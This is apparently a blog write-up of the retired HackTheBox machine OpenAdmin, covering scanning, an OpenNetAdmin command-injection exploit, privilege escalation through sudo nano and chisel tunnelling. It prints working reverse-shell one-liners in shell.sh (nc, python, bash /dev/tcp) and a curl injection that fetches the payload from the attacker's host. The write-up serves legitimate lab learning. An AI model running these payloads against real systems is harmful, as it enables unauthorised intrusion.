---
title: "OpenAdmin HackTheBox Writeup" 
last_modified_at: 2021-07-04T7:21:02-05:00
categories:
  - htb
author_profile: false
tags:
  - nmap
  - hackthebox
  - htb
  - writeup
  - walkthrough
  - ssh2john
  - opennetadmin
  - CVE
  - easy
  - linux
  - john
  - ffuf
  - chisel
  - port forwarding
  - hash cracking
  - nano
  - gtfobins
  - sudo -l
---

<script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="reddevil2020" data-description="Support me on Buy me a coffee!"  data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>


![image](/assets/images/htb-boxes/openadmin/openadmin.png)

[Openadmin](https://www.hackthebox.eu/home/machines/profile/222) is an easy rated linux box on hackthebox by [del_KZx497Ju](https://www.hackthebox.eu/home/users/profile/82600). Outdated and vulnerable instance of OpenNetAdmin is exploited to get a shell on the box as www-data. From the webserver running internally, we get SSH key for user joanna. User joanna can run nano as root which was exploited to get root shell on the box.
# Nmap
## Initial Scan
```console
# Nmap 7.80 scan initiated Sun Jul  4 18:05:05 2021 as: nmap -sC -sV -oN nmap/initial -v 10.10.10.171
Nmap scan report for 10.10.10.171
Host is up (0.21s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul  4 18:05:27 2021 -- 1 IP address (1 host up) scanned in 22.07 seconds
```
- Only two ports are open.
- SSH is running on Port 22 and HTTP on Port 80.

# HTTP Service on Port 80
![image](/assets/images/htb-boxes/openadmin/Pasted image 20210704180730.png)
We get a default page for apache.

## Fuzzing using ffuf
![image](/assets/images/htb-boxes/openadmin/Pasted image 20210704182430.png)

Lets us check /music.

## Checking /music
![image](/assets/images/htb-boxes/openadmin/Pasted image 20210704181012.png)

Most of the links on the page do not go anywhere, but login does.

## Checking the login button 
![image](/assets/images/htb-boxes/openadmin/Pasted image 20210704181300.png)
- We are brought to /ona/.
- This is an outdated version of netopenadmin.
- And we can see a DNS Domain record.

Clicking on that record, a popup opened which gave us a hostname. So let us add this to our hosts file.
![image](/assets/images/htb-boxes/openadmin/Pasted image 20210704181448.png)


## Checking for publicly available exploit
Since the version of the OpenNetAdmin is the outdated one, let us check on searchsploit if there are any publicly available exploits.
![image](/assets/images/htb-boxes/openadmin/Pasted image 20210704181716.png)
We have two unique exploits, one for version 13 and one for 18. But we dont know what version we are running.

## Checking one of the exploit
![image](/assets/images/htb-boxes/openadmin/Pasted image 20210704181829.png)
This date on the exploit is 2019-11-19, which means this is a recent exploit. So let us try this exploit even if we dont know the version of the OpenNetAdmin running on the machine.

## Running the exploit
![image](/assets/images/htb-boxes/openadmin/Pasted image 20210704182206.png)
We get code execution right away.

## Getting a reverse shell
I like to host a file on my box with bunch of reverse shell payload, download it from the remote box and execute it.

## Content of the shell.sh
```console
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.22 9001 >/tmp/f

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.22",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.22",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

bash -i >& /dev/tcp/10.10.14.22/9001 0>&1
```

## Running the exploit
```console
reddevil@ubuntu:~/Documents/htb/retired/openadmin$ curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";curl 10.10.14.22:8000/shell.sh -o /tmp/shell.sh;echo \"END\"&xajaxargs[]=ping" "http://openadmin.ht
b/ona/" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
```
I get a callback for the file on the python server.
```console
reddevil@ubuntu:~/Documents/htb/retired/www$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.171 - - [04/Jul/2021 18:23:43] "GET /shell.sh HTTP/1.1" 200 -
```

Now I just have to execute the payload.
![image](/assets/images/htb-boxes/openadmin/Pasted image 20210704183038.png)
We get a shell and we are running as www-data user.

## Getting a TTY
```console
$ which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@openadmin:/opt/ona/www$ ^Z
[1]+  Stopped                 nc -nvlp 9001
reddevil@ubuntu:~/Documents/htb/retired/openadmin$ stty raw -echo
reddevil@ubuntu:~/Documents/htb/retired/openadmin$ nc -nvlp 9001

www-data@openadmin:/opt/ona/www$ export TERM=xterm
```

# Privilege Escalation
## Listing listening ports
```console
www-data@openadmin:/var/www$ ss -ltnp
State              Recv-Q              Send-Q                            Local Address:Port                            Peer Address:Port              
LISTEN             0                   128                               127.0.0.53%lo:53                                   0.0.0.0:*                 
LISTEN             0                   128                                     0.0.0.0:22                                   0.0.0.0:*                 
LISTEN             0                   80                                    127.0.0.1:3306                                 0.0.0.0:*                 
LISTEN             0                   128                                   127.0.0.1:52846                                0.0.0.0:*                 
LISTEN             0                   128                                           *:80                                         *:*                 
LISTEN             0                   128                                        [::]:22  
```
We have two new ports open which we did not see on our nmap scan. It is because they are only listening on the local interface.

## Checking if port 52846 is hosting a webserver
```console
www-data@openadmin:/var/www$ curl -I 127.0.0.1:52846
HTTP/1.1 200 OK
Date: Sun, 04 Jul 2021 12:58:26 GMT
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: PHPSESSID=70uf1pv169g9itnmbj9a2mvb2i; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=UTF-8
```


## Checking /var/www
```console
www-data@openadmin:/var/www$ ls -la
total 16
drwxr-xr-x  4 root     root     4096 Nov 22  2019 .
drwxr-xr-x 14 root     root     4096 Nov 21  2019 ..
drwxr-xr-x  6 www-data www-data 4096 Nov 22  2019 html
drwxrwx---  2 jimmy    internal 4096 Nov 23  2019 internal
lrwxrwxrwx  1 www-data www-data   12 Nov 21  2019 ona -> /opt/ona/www
```
Internal must host the files for internal webserver. It is owned by user jimmy and group internal. Since, we do not belong to any of those we can not read the contents of that folder.


We can try and enumerate the webserver from our reverse shell but it will make our life so much difficult. So, I will use chisel for port forwarding and access the port from my own local box.

## Port forwarding using chisel
On client
```console
reddevil@ubuntu:~/Documents/htb/retired/www$ ./chisel server -p 1880 --reverse
2021/07/04 18:56:39 server: Reverse tunnelling enabled
2021/07/04 18:56:39 server: Fingerprint eUn7pldxI7MVcrR5tDOZc6uK39DGwtpxyXnWMbrOhUA=
2021/07/04 18:56:39 server: Listening on http://0.0.0.0:1880
```
On Server
```console
$ ./chisel client 10.10.14.22:1880 R:52846:127.0.0.1:52846
2021/07/04 13:12:12 client: Connecting to ws://10.10.14.22:1880
2021/07/04 13:12:14 client: Connected (Latency 203.29487ms)
```

# HTTP Service on Port 52846
![image](/assets/images/htb-boxes/openadmin/Pasted image 20210704185831.png)

## Fuzzing with ffuf
```console
reddevil@ubuntu:~/Documents/htb/retired/openadmin$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://localhost:52846/FUZZ -e .txt,.php,.html

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://localhost:52846/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .txt .php .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

index.php               [Status: 200, Size: 2519, Words: 836, Lines: 96]
main.php                [Status: 302, Size: 1902, Words: 21, Lines: 35]
logout.php              [Status: 200, Size: 24, Words: 4, Lines: 1]
```
We get few routes.

## index.php
![image](/assets/images/htb-boxes/openadmin/Pasted image 20210704191702.png)
Checked for basics sqli and parameter tampering with few special characters, but got nothing.

## main.php
![image](/assets/images/htb-boxes/openadmin/Pasted image 20210704191810.png)
- main.php has a private key and redirects us to index.php.
- The key is protected.

## Trying to crack the hash with john
![image](/assets/images/htb-boxes/openadmin/Pasted image 20210704191929.png)
![image](/assets/images/htb-boxes/openadmin/Pasted image 20210704192007.png)
And the hash is successfully cracked.

## Logging with the key using ssh
Listing users on the box
```console
www-data@openadmin:/var/www$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
```

The key was for joanna.
```console
reddevil@ubuntu:~/Documents/htb/retired/openadmin$ ssh -i key joanna@openadmin.htb
Enter passphrase for key 'key': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jul  4 13:36:17 UTC 2021

  System load:  0.0               Processes:             158
  Usage of /:   50.1% of 7.81GB   Users logged in:       1
  Memory usage: 33%               IP address for ens160: 10.10.10.171
  Swap usage:   0%

  => There are 2 zombie processes.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Jan  2 21:12:40 2020 from 10.10.14.3
joanna@openadmin:~$ id
uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
```
User joanna is in the internal group and if we remember correctly, the webserver code was owned by group internal.

## Reading user.txt
```console
joanna@openadmin:~$ cat user.txt 
c9b2c************660f0c81b5f
```

## Checking the content of the webserver
```console
joanna@openadmin:/var/www/internal$ ls -la
total 20
drwxrwx--- 2 jimmy internal 4096 Nov 23  2019 .
drwxr-xr-x 4 root  root     4096 Nov 22  2019 ..
-rwxrwxr-x 1 jimmy internal 3229 Nov 22  2019 index.php
-rwxrwxr-x 1 jimmy internal  185 Nov 23  2019 logout.php
-rwxrwxr-x 1 jimmy internal  339 Nov 23  2019 main.php
```

## Hash on index.php
![image](/assets/images/htb-boxes/openadmin/Pasted image 20210704192427.png)
It contains the SHA512 hash for user jimmy. We can try and crack the hash and check whether user jimmy has reused his password for the login unix account.


## Trying to crack the hash
![image](/assets/images/htb-boxes/openadmin/Pasted image 20210704192824.png)
The hash is succesfully cracked and the password is Revealed.

## Checking if user jimmy has reused the password
```console
joanna@openadmin:/var/www/internal$ su jimmy
Password: 
su: Authentication failure
```
Turns out he has not.

## Checking sudo -l
```console
joanna@openadmin:/var/www/internal$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```
We can run a command as root without password.

## Running the command
![image](/assets/images/htb-boxes/openadmin/Pasted image 20210704193014.png)
We are inside nano which is running with the privilege of the root user.

## Checking gtfobins if we can execute command using nano
And it turns out we can.
![image](/assets/images/htb-boxes/openadmin/Pasted image 20210704193104.png)
So, let us get a shell as root user.

## Root shell
![image](/assets/images/htb-boxes/openadmin/Pasted image 20210704193144.png)


## Reading root.txt
```console
# cd /root
# ls
root.txt
# cat root.txt
2f907ed**********5d5b561
```